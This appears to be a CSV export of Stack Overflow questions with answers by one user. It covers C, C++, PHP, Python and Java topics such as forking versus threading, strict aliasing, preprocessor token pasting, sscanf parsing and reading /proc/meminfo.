","9530","Adam Rosenfield","<p>Forking is an expensive operation.  From the looks of it, what you really want is multi**threading**, not multi**processing**.  The difference is that threads are much lighter weight than processes, since threads share a virtual address space but processes have separate virtual address spaces.</p>

<p>I'm not a PHP developer, but a quick Google search reveals that PHP does not support multithreading natively, but there are libraries to do the job.</p>

<p>Anyways, once you figure out how to spawn threads, you should figure out how many threads to spawn.  In order to do this, you need to know what the bottleneck of your application is.  Is the bottleneck CPU, memory, or I/O?  You've indicated in your comments that you are network-bound, and network is a type of I/O.</p>

<p>If you were CPU bound, you're only going to get as much parallelism as you have CPU cores; any more threads and you're just wasting time doing context switches.  Assuming you can figure out how many total threads to spawn, you should divide your work into that many units, and have each thread process one unit independently.</p>

<p>If you were memory bound, then multithreading would not help.</p>

<p>Since you're I/O bound, figuring out how many threads to spawn is a little trickier.  If all work items take approximately the same time to process with very low variance, you can estimate how many threads to spawn by measuring how long one work item takes.  However, since network packets tend to have highly variable latencies, this is unlikely to be the case.</p>

<p>One option is to use thread pools - you create a whole bunch of threads, and then for each item to process, you see if there is a free thread in the pool.  If there is, you have that thread perform the work, and you move onto the next item.  Otherwise, you wait for a thread to become available.  Choosing the size of the thread pool is important - too big, and you're wasting time doing unnecessary context switches.  Too few, and you're waiting for threads too often.</p>

<p>Yet another option is to abandon multithreading/multiprocessing and just do asynchronous I/O instead.  Since you mentioned you're working on a single-core processor, this will probably be the fastest option.  You can use functions like <a href=""http://www.php.net/manual/en/function.socket-select.php"" rel=""nofollow""><code>socket_select()</code></a> to test if a socket has data available.  If it does, you can read the data, otherwise you move onto a different socket.  This requires doing a lot more bookkeeping, but you avoid waiting for data to come in on one socket when data is available on a different socket.</p>

<p>If you want to eschew threads and asynchronous I/O and stick with multiprocessing, it can still be worthwhile if the per-item processing is expensive enough.  You might then do the work division like so:</p>

<pre><code>$my_process_index = 0;
$pids = array();

// Fork off $max_procs processes
for($i = 0; $i &lt; $max_procs - 1; $i++)
{
  $pid = pcntl_fork();
  if($pid == -1)
  {
    die(""couldn't fork()"");
  }
  elseif($pid &gt; 0)
  {
    // parent
    $my_process_index++;
    $pids[] = $pid
  }
  else
  {
    // child
    break;
  }
}

// $my_process_index is now an integer in the range [0, $max_procs), unique among all the processes
// Each process will now process 1/$max_procs of the items
for($i = $my_process_index; $i &lt; length($items); $i += $max_procs)
{
  do_stuff_with($items[$i]);
}

if($my_process_index != 0)
{
  exit(0);
}
</code></pre>
"
"<p>So I'm trying to run my first hello world prog written in C. I compiled it in eclipse and get no errors, but when I try to run it I get:</p>

<p>""This application has failed to start because cygwin1.dll was not found.""</p>

<p>I found <a href=""http://dev.eclipse.org/newslists/news.eclipse.tools.cdt/msg08271.html"">this post</a> which seems to indicate I should add it to Windows PATH, and I used <a href=""http://www.computerhope.com/issues/ch000549.htm"">this</a> to do that. So now ""Path"" in my environment variables has "";C:\cygwin\bin\cygwin1.dll"" appended to the end. Still no worky. Anyone have a clue what I might be doing wrong? My 'program' just looks like this: </p>

<pre><code>#include &lt;stdio.h&gt;

main()
{
    printf(""hello, world\n"");
}
</code></pre>
","9530","Adam Rosenfield","<p>The PATH environment variable needs to include the directory containing cygwin1.dll, not the path to cygwin1.dll itself.  So just make sure that PATH has the string <code>""C:\cygwin\bin""</code> in it.</p>
"
"<p>I have just installed the Platform SDK for Windows Server 2008 and .NET 3.5 on my new system, and for the first time tried to compile a project for WIN64.  The Unicode Release version of that program, built for 32 bit (using the optimizing compiler from the no longer available Free Toolkit), comes in at about 2.8 MB.  Using the amd64 compiler from the latest PSDK the program is more than 5 MB big.</p>

<p>I'm most concerned with program size, so everything is built with /O1 switch.  I was expecting the program to become larger when built for 64 bit, but not that much.  The size is more in line with a build from the Express version, where (some) optimizations are not available.</p>

<p>Do the compiler in the PSDK and the compiler from MSVC 2008 Professional create programs of very different sizes?  Does the compiler in the PSDK optimize in the same way, or even at all?</p>

<p>Thanks for any insight.</p>

<p><strong>Edit:</strong></p>

<p>The program and all linked libraries are built using the same makefile.vc on the command line, so differences in compilation settings are not likely.  I basically just used another command file to start a shell with proper environment for 64 bit compilation.</p>

<p>Here are the sizes for the application:</p>

<pre>
    VC++ Toolkit 2003   32 bit   cl.exe: 13.10.3052 for 80x86       2.916.352
    Platform SDK        32 bit   cl.exe: 15.00.30729.01 for 80x86   2.881.536
    Platform SDK        64 bit   cl.exe: 15.00.21022.08 for x64     5.138.432
</pre>

<p>So the 64 bit version is 78% larger :-(</p>
","9530","Adam Rosenfield","<p>I highly doubt that it's the optimizer.  The difference in program size probably has to with debugging information and/or static libraries being linked in.  Make sure you're not linking against any static libraries you don't need.</p>
"
"<p>[This is for PC/Visual C++ specifically (although any other answers would be quite illuminating :))]</p>

<p>How can you tell if a pointer comes from an object in the stack? For example:</p>

<pre><code>int g_n = 0;

void F()
{
    int *pA = &amp;s_n;
    ASSERT_IS_POINTER_ON_STACK(pA);
    int i = 0;
    int *pB = &amp;i;
    ASSERT_IS_POINTER_ON_STACK(pB);
}
</code></pre>

<p>so only the second assert <em>(pB)</em> should trip. I'm thinking using some inline assembly to figure out if it's within the SS segment register or something like that. Does anybody know if there's any built in functions for this, or a simple way to do this?</p>

<p>Thanks!
RC</p>
","9530","Adam Rosenfield","<p>Whatever you do, it'll be extremely platform-specific and non-portable.  Assuming you're ok with that, read on.  If a pointer points somewhere in the stack, it will lie between the current stack pointer <code>%esp</code> and the top of the stack.</p>

<p>One way to get the top of the stack is to read it in at the beginning of <code>main()</code>.  However, this has a few problems:
- The top of the stack is actually slightly higher, since the C runtime initializes the stack before entering <code>main()</code>
- In C++, global objects' constructors are called before <code>main()</code>
- If your application is multithreaded, each thread has its own separate stack.  In that case, you'd need a thread-local variable describing the base of the stack</p>

<p>One way to get the current stack pointer is using inline assembly:</p>

<pre><code>uint32_t GetESP(void)
{
    uint32_t ret;
    asm
    {
        mov esp, ret
    }
    return ret;
}
</code></pre>

<p>Beware of inlining and optimization!  The optimizer might break this code.</p>
"
"<p>When debugging my VS2005 project, I get the following error when I attempt to step into the function that returns the <em>vScenarioDescriptions</em> local variable it's struggling with...</p>

<p><em><img src=""http://people.ict.usc.edu/~crotchett/images/symbolnotdefined.JPG"" alt=""image no longer available""></em></p>

<p>As I continue to walk through the code and step into functions, it appears I'm getting this error other local variables as well.  Any ideas?</p>

<p>Thanks in advance for your help!</p>
","9530","Adam Rosenfield","<p>It might be a namespace issue.  Try adding <code>namespace::</code> before your symbol in the debugger watch window, if the symbols you're trying to watch are inside a namespace.</p>
"
"<p>When reading lines from a text file using python, the end-line character often needs to be truncated before processing the text, as in the following example:</p>

<pre><code>    f = open(""myFile.txt"", ""r"")
    for line in f:
        line = line[:-1]
        # do something with line
</code></pre>

<p>Is there an elegant way or idiom for retrieving text lines without the end-line character?</p>
","9530","Adam Rosenfield","<p>What's wrong with your code?  I find it to be quite elegant and simple.  The only problem is that if the file doesn't end in a newline, the last line returned won't have a <code>'\n'</code> as the last character, and therefore doing <code>line = line[:-1]</code> would incorrectly strip off the last character of the line.</p>

<p>The most elegant way to solve this problem would be to define a generator which took the lines of the file and removed the last character from each line only if that character is a newline:</p>

<pre><code>def strip_trailing_newlines(file):
    for line in file:
        if line[-1] == '\n':
            yield line[:-1]
        else:
            yield line

f = open(""myFile.txt"", ""r"")
for line in strip_trailing_newlines(f):
    # do something with line
</code></pre>
"
"<p>how to get GIF Transparency color in vc++ 6.0 and vc++ 2005 ?</p>
","9530","Adam Rosenfield","<p>See the <a href=""http://www.martinreddy.net/gfx/2d/GIF89a.txt"" rel=""nofollow"">GIF specification</a>.  GIFs have a palette of up to 256 possible colors.  The palette index of the background color can be found at offset 11 from the beginning of the file, and consists of a single byte (value 0-255).  To find the actual color that this corresponds to, look up that color in the Global Color Table.  See the spec for more information on how to parse the Global Color Table.</p>
"
"<p>My computer often produces a ""ding"" sound, and I can't associate it with anything.  Is it possible to programmatically determine the source of the beeps?  For example can I hook the sound driver?  If so, can you point out some examples or references?</p>
","9530","Adam Rosenfield","<p>What operating system is this?  If you're on Linux, you can use the <a href=""http://linux.die.net/man/8/lsof"" rel=""nofollow""><code>lsof(8)</code></a> command to see what files every process has open.  If a process is playing sound, it will have the sound device file open, so you can grep for it like so:</p>

<pre><code>lsof | grep -E '/dev/(snd|dsp)'
</code></pre>

<p>Another option is to use <a href=""http://linux.die.net/man/1/fuser"" rel=""nofollow""><code>fuser(1)</code></a>, which works similarly to <code>lsof</code>.</p>
"
"<p>I would like to deploy a very simple DLL with my C# application, but any DLL that I build in Visual Studio 2008 seems to have a dependency on ""Microsoft.VC90.CRT"". Is it possible to build a DLL using VS2008 without this dependency? How can I tell what is causing the dependency?</p>
","9530","Adam Rosenfield","<p>If you're absolutely sure you don't have any dependencies on the C runtime, then you can avoid linking against it by enabling the ""Ignore All Default Libraries"" (/NODEFAULTLIB) flag under the Linker -> Input project options page.  You may also have to disable basic runtime checks (set ""Basic Runtime Checks"" to Default under C/C++ -> Code Generation), and you might also have to remove the entry point (set ""No Entry Point"" to ""Yes (/NOENTRY)"" under Linker -> Advanced).</p>

<p>See also <a href=""http://support.microsoft.com/kb/814472"" rel=""nofollow"">http://support.microsoft.com/kb/814472</a>, it has some good information about building DLLs for Managed Extensions for C++.</p>

<p><strong>Edit:</strong> Notice that running without C runtime also means you don't have easy memory allocation function like malloc() and new.</p>
"
"<p>All objects in my program inherit from a Container class. The Container class has a <code>virtual BaseNode* getParent() const;</code> method and a <code>virtual void setParent(BaseNode *p);</code> method. </p>

<p>I have a <code>Set</code> class (Set in a tennis match, not a data structure) which has the <code>Match</code> class as it's parent (via <code>setParent()</code>) but since <code>Set</code> inherits from <code>Container</code>,  The program creates a tree structure from the top down and the <code>Set</code> class is a child, it doesn't need to have methods to track and maintain information about it's parent beyond what <code>Container</code> provides. </p>

<p>The error <code>C++: invalid conversion from  ‘BaseNode*’ to ‘Match*’</code> shows up in the method below when I try to compile my program. (<code>Player* getPlayer1() const;</code> only exists in the <code>Match</code> class)</p>

<pre><code>Player* Set::getPlayer1() const{
    return getParent()-&gt;getPlayer1();
}
</code></pre>

<p>This is my inheritance structure for Match. (Note that <code>TreeNode</code> is a template)</p>

<pre><code>Match -&gt; TreeNode&lt;Set&gt; -&gt; BaseNode -&gt; Container
</code></pre>

<p>I don't understand why I'm getting a conversation error. I have tried reading my textbook but it's a rather poor reference. Google just provided too much irrelevant information.</p>

<p><strong>Edit</strong></p>

<pre><code>Player* Set::getPlayer1() const{
    return dynamic_cast&lt;Match&gt;(getParent())-&gt;getPlayer1();
}
</code></pre>

<p>causes</p>

<pre><code>error: cannot dynamic_cast ‘#‘obj_type_ref’ not supported by dump_expr#&lt;expression error&gt;((&amp;((const Set*)this)-&gt;Set::&lt;anonymous&gt;))’ (of type ‘class BaseNode*’) to type ‘class Match’ (target is not pointer or reference)
</code></pre>

<p><strong>Edit 2</strong></p>

<p>I just realized I need <code>dynamic_cast&lt;Match*&gt;</code> which works.</p>
","9530","Adam Rosenfield","<p>The problem is that <code>getParent()</code> returns a <code>BaseNode*</code>, which could be a pointer to any type of <code>BaseNode</code> - it might point to an unrelated class that also derives from <code>BaseNode</code>.  If you're 100% sure that the parent must be of type <code>Match</code>, you should cast the parent to a <code>Match*</code> first, and then you can call <code>getPlayer()</code> on that:</p>

<pre><code>Player* Set::getPlayer1() const{
    return dynamic_cast&lt;Match*&gt;(getParent())-&gt;getPlayer1();
}
</code></pre>

<p>If the parent isn't necessary a <code>Match</code>, then <code>dynamic_cast</code> might return NULL, so be sure to check for that.</p>
"
"<p>I need to increment a String in java from ""aaaaaaaa"" to ""aaaaaab"" to ""aaaaaac"" up through the alphabet, then eventually to ""aaaaaaba"" to ""aaaaaabb"" etc. etc.</p>

<p>Is there a trick for this?</p>
","9530","Adam Rosenfield","<p>Increment the last character, and if it reaches Z, reset it to A and move to the previous characters.  Repeat until you find a character that's not Z.  Because Strings are immutable, I suggest using an array of characters instead to avoid allocating lots and lots of new objects.</p>

<pre><code>public static void incrementString(char[] str)
{
    for(int pos = str.length - 1; pos &gt;= 0; pos--)
    {
        if(Character.toUpperCase(str[pos]) != 'Z')
        {
            str[pos]++;
            break;
        }
        else
            str[pos] = 'a';
    }
}
</code></pre>
"
"<p>This is a continuation of my question about <a href=""http://stackoverflow.com/questions/339795/reading-the-superblock"">reading the superblock</a>.</p>

<p>Let's say I want to target the HFS+ file system in Mac OS X. How could I read sector 2 of the boot disk? As far as I know Unix only provides system calls to read from files, which are never stored at that location.</p>

<p>Does this require either 1) the program to run kernel mode, or 2) the program to be written in Assembly? I would prefer to avoid either of these restrictions, particularly the latter.</p>
","9530","Adam Rosenfield","<p>In Linux, you can read from the special device file <code>/dev/sda</code>, assuming the hard drive you want to read is the first one.  You need to be root to read this file.  To read sector 2, you just seek to offset <code>2*SECTOR_SIZE</code> and read in <code>SECTOR_SIZE</code> bytes.</p>

<p>I don't know if this device file is available on OS X.  Check for interestingly named files under <code>/dev</code> such as <code>/dev/sda</code> or <code>/dev/hda</code>.</p>
"
"<p>I want to write my own little chat server in C on a MacOS machine. Now I want to connect to all clients, that are online and let the connection open, to be able to receive and send messages. The problem is that I only know, how to have one socket connection at a time open. So only one client can connect so far and chatting like that is kinda boring ;)</p>
","9530","Adam Rosenfield","<p>One option is to use multithreading with the <a href=""https://computing.llnl.gov/tutorials/pthreads/"" rel=""nofollow"">pthreads</a> library.  Another option is to use asynchronous I/O with the <a href=""http://linux.die.net/man/2/select"" rel=""nofollow""><code>select(2)</code></a> call.  With <code>select(2)</code>, you open a bunch of sockets, and then you can poll each one to see if it has data.  If it has data, you read it, otherwise you move on to the next socket.</p>
"
"<p><strong>UPDATE:</strong>
Obviously, you'd want to do this using templates or a base class rather than macros. Unfortunately for various reasons I can't use templates, or a base class.</p>

<p><hr/></p>

<p>At the moment I am using a macro to define a bunch of fields and methods on various classes, like this:</p>

<pre><code>class Example
{
  // Use FIELDS_AND_METHODS macro to define some methods and fields
  FIELDS_AND_METHODS(Example)
};
</code></pre>

<p><code>FIELDS_AND_METHODS</code> is a multi-line macro that uses stringizing and token-pasting operators.</p>

<p>I would like to replace this with the following kind of thing</p>

<pre><code>class Example
{
  // Include FieldsNMethods.h, with TYPE_NAME preprocessor symbol
  // defined, to achieve the same result as the macro.
  #define TYPE_NAME Example
  #include ""FieldsNMethods.h""
};
</code></pre>

<p>Here I #define the name of the class (previously the parameter to the macro), and the <code>FieldsNMethods.h</code> file contains the content of the original macro. However, because I'm #including I can step into the code at runtime, when debugging.</p>

<p>However I am having trouble 'stringizing' and 'token pasting' the <code>TYPE_NAME</code> preprocessor symbol in the <code>FieldsNMethods.h</code> file.</p>

<p>For example, I want to define the destructor of the class in <code>FieldsNMethods.h</code>, so this would need to use the value of <code>TYPE_NAME</code> as below:</p>

<pre><code>~TYPE_NAME()
{
  //...
}
</code></pre>

<p>But with <code>TYPE_NAME</code> replaced by its value.</p>

<p>Is what I'm attempting possible? I can't use the stringizing and token-pasting operators directly, because I'm not in a macro definition.</p>
","9530","Adam Rosenfield","<p>You have to add an extra layer of macros:</p>

<pre><code>#define STRINGIZE(x) STRINGIZE2(x)
#define STRINGIZE2(x) #x

#define TOKENPASTE(x, y) TOKENPASTE2(x, y)
#define TOKENPASTE2(x, y) x ## y
</code></pre>

<p>The reason is that when you have a macro, the preprocessor normally recursively expands the arguments before performing the macro substitution.  However, if any argument is used with the stringizing operator # or the token-pasting operator ##, it is <em>not</em> expanded.  Therefore, you need an extra layer of macros, where the first layer expands the arguments, and the second layer performs the stringizing or token pasting.</p>

<p>If the arguments need to be expanded multiple times (such as <code>#define A B, #define B C, #define C D, STRINGIZE(A)</code>), then you need to add that many more layers before you apply the # or ## operators.</p>
"
"<p>How, under Windows and Linux, given a thread handle can I determine the beginning and end of its corresponding static thread local storage block?</p>
","9530","Adam Rosenfield","<p>See <a href=""http://msdn.microsoft.com/en-us/library/6yh4a9k1(VS.80).aspx"" rel=""nofollow"">MSDN</a> for more info about the various thread-local storage-related functions.  You can use <a href=""http://msdn.microsoft.com/en-us/library/ms686812(VS.85).aspx"" rel=""nofollow"">TlsGetValue()</a> to get a specific TLS value; don't go poking around in memory, even if it works - you're just invoking undefined behavior which happens to work but could happen to break in future versions of Windows.</p>
"
"<p>How, under Windows and Linux, given a thread handle can I determine the beginning and end of its corresponding static thread local storage block?</p>
","9530","Adam Rosenfield","<p>You can find this information in the <a href=""http://en.wikipedia.org/wiki/Win32_Thread_Information_Block"" rel=""nofollow"">Thread Information Block</a>.  Please note, however, that doing so is accessing undocumented structures and is thus <strong>highly non-portable and likely to break in future version of Windows</strong>.  It appears that you can get the <em>current thread</em>'s thread-local storage arena from the TIB; I'm not sure who you'd get another thread's TLS.</p>

<p>You could try digging into the Process Environment Block (PEB), at offset 0x30 in the TIB, but again, you're dealing with undocumented structures that are subject to change.</p>
"
"<p>I'm trying to use the freeware <a href=""http://www.nontube.com/products/multiple-find-and-replace/"" rel=""nofollow"">Multiple Find And Replace 1.00</a> suggested in <a href=""http://stackoverflow.com/questions/268045/multi-line-search-and-replace-tool#272325"">this question</a>.</p>

<p><img src=""http://www.nontube.com/images/screenshot-mfar.png"" alt=""Multiple Find And Replace 1.00"" /></p>

<p>Unfortunately it requires that I explicitly select each file I'd like it to search.</p>

<p>But, it does allow me to load in a text file of the file paths.</p>

<pre>C:\one.txt  
C:\two.txt  
C:\somedirectory\three.txt</pre>

<p><strong>I'd like a text file of paths to all files with extension .php within a certain directory and all its subdirectories (recursive).</strong></p>

<p>Does anyone know of a ready-made tool I can use to quickly generate such a list of files?</p>
","9530","Adam Rosenfield","<p>If you don't mind installing <a href=""http://www.cygwin.com/"" rel=""nofollow"">Cygwin</a>, the following one-liner will do the find-and-replace:</p>

<pre><code>find basedir -name \*.php -exec sed -i 's/text-to-find/text-to-replace/g' '{}' '+'
</code></pre>

<p><code>sed</code> also support regular expressions, so the text-to-find can be a regex, and the text-to-replace can contain references to groups fro the pattern text.</p>
"
"<p>I'm curious about conventions for type-punning pointers/arrays in C++.  Here's the use case I have at the moment:</p>

<blockquote>
Compute a simple 32-bit checksum over a binary blob of data by treating it as an array of 32-bit integers (we know its total length is a multiple of 4), and then summing up all values and ignoring overflow.
</blockquote>

<p>I would expect such an function to look like this:</p>

<pre><code>uint32_t compute_checksum(const char *data, size_t size)
{
    const uint32_t *udata = /* ??? */;
    uint32_t checksum = 0;
    for (size_t i = 0; i != size / 4; ++i)
        checksum += udata[i];
    return udata;
 }
</code></pre>

<p>Now the question I have is, what do you consider the ""best"" way to convert <code>data</code> to <code>udata</code>?</p>

<p>C-style cast?</p>

<pre><code>udata = (const uint32_t *)data
</code></pre>

<p>C++ cast that assumes all pointers are convertible?</p>

<pre><code>udata = reinterpret_cast&lt;const uint32_t *&gt;(data)
</code></pre>

<p>C++ cast that between arbitrary pointer types using intermediate <code>void*</code>?</p>

<pre><code>udata = static_cast&lt;const uint32_t *&gt;(static_cast&lt;const void *&gt;(data))
</code></pre>

<p>Cast through a union?</p>

<pre><code>union {
    const uint32_t *udata;
    const char *cdata;
};
cdata = data;
// now use udata
</code></pre>

<p>I fully realize that this will not be a 100% portable solution, but I am only expecting to use it on a small set of platforms where I know it works (namely unaligned memory accesses and compiler assumptions on pointer aliasing).  What would you recommend?</p>
","9530","Adam Rosenfield","<p>As far as the C++ standard is concerned, <a href=""http://stackoverflow.com/questions/346622/opinions-on-type-punning-in-c#346675"">litb</a>'s answer is completely correct and the most portable.  Casting <code>const char *data</code> to a <code>const uint3_t *</code>, whether it be via a C-style cast, <code>static_cast</code>, or <code>reinterpret_cast</code>, breaks the strict aliasing rules (see <a href=""http://www.cellperformance.com/mike_acton/2006/06/understanding_strict_aliasing.html"">Understanding Strict Aliasing</a>).  If you compile with full optimization, there's a good chance the code will not to the right thing.</p>

<p>Casting through a union (such as litb's <code>my_reint</code>) is probably the best solution, although it does technically violate the rule that if you write to a union through one member and read it through another, it results in undefined behavior.  However, practically all compilers support this, and it results in the the expected result.  If you absolutely desire to conform to the standard 100%, go with the bit-shifting method.  Otherwise, I'd recommend going with casting through a union, which is likely to give you better performance.</p>
"
"<p>I'm trying to do project Euler number <a href=""http://projecteuler.net/index.php?section=problems&amp;id=219"" rel=""nofollow"">219</a> but am failing to get a grasp of it. I'm trying to use Python which according to project Euler should be able to do it within a minute! This leads me to think that they can't possibly want me to compute each individual bitstring since that would be too slow in Python - there has to be a sub O(n) algorithm.</p>

<p>I have looked at a recursive solution which stores the bitstrings possible prefixes so that it can quickly pick a new bitstring and it even considers them in groups. This only works in brute-forcing values up to a bit over 10:</p>

<pre><code>cost(1) = 1
cost(2) = 5
cost(3) = 11
cost(4) = 18
cost(5) = 26
cost(6) = 35
cost(7) = 44
cost(8) = 54
cost(9) = 64
cost(10)= 74
cost(11)= 85
cost(12)= 96
</code></pre>

<p>Past this, I am struggling to comprehend how reduce the problem. It is always possible to make a pattern that goes like:</p>

<pre><code>1
01
001
0001
00001
00000
</code></pre>

<p>But it isn't optimal for more than 7 bitstrings. Can anyone guide me in what I should be considering?</p>
","9530","Adam Rosenfield","<p>Brute-force is not the right way to do it.  This is one of those problems where, if you know a certain thing, it's not that hard, but if you've never heard of that thing, it's practically impossible.  That thing is <a href=""http://en.wikipedia.org/wiki/Huffman_tree"">Huffman trees</a>.</p>

<p>[Edit] Upon further review, it seems that you can't quite build a Huffman tree on N nodes with certain frequencies, because the cost function for a string is 4*(# of 1's) + (# of 0's).  If the cost function were the length of the string (or a multiple thereof), then you could create a Huffman tree.</p>

<p>Any prefix-free code set can be represented as a Huffman-like binary tree, where each node has either 0 or 2 children, and the leaf nodes represent the codes.  Given a tree with N nodes, we can construct a tree with N+1 nodes as follows:</p>

<ol>
<li>Choose the leaf node with the smallest cost, where the cost of a leaf node is 4*(# of 1's on path from root to leaf) + (# of 0's on path)</li>
<li>Add 2 children to that node</li>
</ol>

<p>Thus, if the code for the node was previously xxxx, then we remove that code from our code set (since it's no longer a leaf), and add the two codes xxxx0 and xxxx1.  The total cost of the code set has now increased by</p>

<p>`cost(xxxx0) + cost(xxxx1) - cost(xxxx) = cost(0) + cost(1) + cost(xxxx) = 5 + cost(xxxx)</p>

<p>Hence, mincost(N+1) &lt;= mincost(N) + 5 + cost(cheapest code in best solution for N).  My theory is that that inequality should be an equality, but I haven't been able to prove it yet.  For all of the values you've listed which you brute-forced, this statement is in fact an equality.</p>

<p>If it is an equality, then to solve the problem what you would do is this:</p>

<ol>
<li>Start with an empty code set at a total cost of zero</li>
<li>Iterating from 1 to 10<sup>9</sup>, do:
<ol>
<li>Find the cheapest code in your code set</li>
<li>Split that code into two by appending 0 and 1</li>
<li>Add the cost of that code + 5 to the total cost</li>
</ol></li>
</ol>

<p>If you use a <a href=""http://en.wikipedia.org/wiki/Priority_queue"">priority queue</a>, you should be able to do this in O(N log N) time.  This may or may not be feasable, given the upper limit of 10<sup>9</sup>.</p>
"
"<p>I'm trying to parse a simple string in C++.  I know the string contains some text with a colon, followed immediately by a space, then a number.  I'd like to extract just the number part of the string.  I can't just tokenize on the space (using sstream and &lt;&lt;) because the text in front of the colon may or may not have spaces in it.</p>

<p>Some example strings might be:</p>

<blockquote>
  <p>Total disk space: 9852465</p>
  
  <p>Free disk space: 6243863</p>
  
  <p>Sectors: 4095</p>
</blockquote>

<p>I'd like to use the standard library, but if you have another solution you can post that too, since others with the same question might like to see different solutions.</p>
","9530","Adam Rosenfield","<p>For completeness, here's a simple solution in C:</p>

<pre><code>int value;
if(sscanf(mystring.c_str(), ""%*[^:]:%d"", &amp;value) == 1)
    // parsing succeeded
else
    // parsing failed
</code></pre>

<p>Explanation: the <code>%*[^:]</code> says to read in as many possible characters that aren't colons, and the <code>*</code> suppresses assignment.  Then, the integer is read in, after the colon and any intervening white space.</p>
"
"<p>I just wrote the following C++ function to programatically determine how much RAM a system has installed.  It works, but it seems to me that there should be a simpler way to do this.  Can someone tell me if I'm missing something?</p>

<pre><code>getRAM()
{
    FILE* stream = popen( ""head -n1 /proc/meminfo"", ""r"" );
    std::ostringstream output;
    int bufsize = 128;

    while( !feof( stream ) &amp;&amp; !ferror( stream ))
    {
        char buf[bufsize];
        int bytesRead = fread( buf, 1, bufsize, stream );
        output.write( buf, bytesRead );
    }
    std::string result = output.str();

    std::string label, ram;
    std::istringstream iss(result);
    iss &gt;&gt; label;
    iss &gt;&gt; ram;

    return ram;
}
</code></pre>

<p>First, I'm using <code>popen(""head -n1 /proc/meminfo"")</code> to get the first line of the meminfo file from the system.  The output of that command looks like</p>

<blockquote>
  <p>MemTotal:       775280 kB</p>
</blockquote>

<p>Once I've got that output in an <code>istringstream</code>, it's simple to tokenize it to get at the information I want.  My question is, is there a simpler way to read in the output of this command?  Is there a standard C++ library call to read in the amount of system RAM?</p>
","9530","Adam Rosenfield","<p>There's no need to use <code>popen()</code>, you can just read the file yourself.  Also, if there first line isn't what you're looking for, you'll fail, since <code>head -n1</code> only reads the first line and then exits.  I'm not sure why you're mixing C and C++ I/O like that; it's perfectly OK, but you should probably opt to go all C or all C++.  I'd probably do it something like this:</p>

<pre><code>int GetRamInKB(void)
{
    FILE *meminfo = fopen(""/proc/meminfo"", ""r"");
    if(meminfo == NULL)
        ... // handle error

    char line[256];
    while(fgets(line, sizeof(line), meminfo))
    {
        int ram;
        if(sscanf(line, ""MemTotal: %d kB"", &amp;ram) == 1)
        {
            fclose(meminfo);
            return ram;
        }
    }

    // If we got here, then we couldn't find the proper line in the meminfo file:
    // do something appropriate like return an error code, throw an exception, etc.
    fclose(meminfo);
    return -1;
}
</code></pre>
"
"<p>Simple code:</p>

<pre><code>&gt;&gt;&gt; set([2,2,1,2,2,2,3,3,5,1])
set([1, 2, 3, 5])
</code></pre>

<p>Ok, in the resulting sets there are no duplicates.
What if the object in the list are not int but are some defined by me?
What method does it check to understand if they are different? I implemented __eq__ and __cmp__ with some objects but <strong>set</strong> doesn't seems to use them :\</p>

<p>Does anyone know how to solve this?</p>
","9530","Adam Rosenfield","<p>According to the <a href=""http://docs.python.org/library/stdtypes.html#set-types-set-frozenset"" rel=""nofollow"">set documentation</a>, the elements must be <a href=""http://docs.python.org/glossary.html#term-hashable"" rel=""nofollow"">hashable</a>.  </p>

<p>An object is hashable if it has a hash value which never changes during its lifetime (it needs a <code>__hash__()</code> method), and can be compared to other objects (it needs an <code>__eq__()</code> or <code>__cmp__()</code> method). Hashable objects which compare equal must have the same hash value.</p>

<p><strong>EDIT</strong>: added proper Hashable definition thanks to Roberto</p>
"
"<pre><code>int x;
printf(""hello %n World\n"", &amp;x);
printf(""%d\n"", x);
</code></pre>
","9530","Adam Rosenfield","<p>It's not so useful for <code>printf()</code>, but it can be very useful for <code>sscanf()</code>, especially if you're parsing a string in multiple iterations.  <code>fscanf()</code> and <code>scanf()</code> automatically advance their internal pointers by the amount of input read, but <code>sscanf()</code> does not.  For example:</p>

<pre><code>char stringToParse[256];
...
char *curPosInString = stringToParse;  // start parsing at the beginning
int bytesRead;
while(needsParsing())
{
    sscanf(curPosInString, ""(format string)%n"", ..., &amp;bytesRead);  // check the return value here
    curPosInString += bytesRead;  // Advance read pointer
    ...
}
</code></pre>
"
"<p>Where I work, people mostly think that objects are best initialised using C++-style construction (with parentheses), whereas primitive types should be initialised with the = operator:</p>

<pre><code>std::string strFoo( ""Foo"" );
int nBar = 5;
</code></pre>

<p>Nobody seems to be able to explain why they prefer things this way, though.  I can see that <code>std::string = ""Foo"";</code> would be inefficient because it would involve an extra copy, but what's wrong with just banishing the <code>=</code> operator altogether and using parentheses everywhere?</p>

<p>Is it a common convention?  What's the thinking behind it?</p>
","9530","Adam Rosenfield","<p>Initializing variables with the = operator or with a constructor call are semantically the same, it's just a question of style.  I prefer the = operator, since it reads more naturally.</p>

<p>Using the = operator <em>usually</em> does not generate an extra copy - it just calls the normal constructor.  Note, however, that with non-primitive types, this is only for initializations that occur at the same time as the declarations.  Compare:</p>

<pre><code>std::string strFooA(""Foo"");  // Calls std::string(const char*) constructor
std::string strFoo = ""Foo"";  // Calls std::string(const char*) constructor
                             // This is a valid (and standard) compiler optimization.

std::string strFoo;  // Calls std::string() default constructor
strFoo = ""Foo"";      // Calls std::string::operator = (const char*)
</code></pre>

<p>When you have non-trivial default constructors, the latter construction can be slightly more inefficient.</p>

<p>The <a href=""http://www.parashift.com/c++-faq-lite/big-picture.html#faq-6.13"" rel=""nofollow"">C++ standard</a>, section 8.5, paragraph 14 states:</p>

<blockquote>
  <p>Otherwise (i.e., for the remaining copy-initialization cases), a temporary is created. User-defined conversion sequences that can convert from the source type to the destination type or a derived class thereof are enumerated (13.3.1.4), and the best one is chosen through overload resolution (13.3).  The user-defined conversion so selected is called to convert the initializer expression into a temporary, whose type is the type returned by the call of the user-defined conversion function, with the cv-qualifiers
  of the destination type. If the conversion cannot be done or is ambiguous, the initialization is ill-formed.  The object being initialized is then direct-initialized
  from the temporary according to the rules above.<sup>87</sup>) <strong>In certain cases, an implementation is permitted to eliminate the temporary by initializing the object directly; see 12.2.</strong></p>
</blockquote>

<p>Part of section 12.2 states:</p>

<blockquote>
  <p>Even when the creation of the temporary object is avoided, all the semantic restrictions must be respected as if the temporary object was created. [Example:
  even if the copy constructor is not called, all the semantic restrictions, such as accessibility (11), shall be satisfied. ]</p>
</blockquote>
"
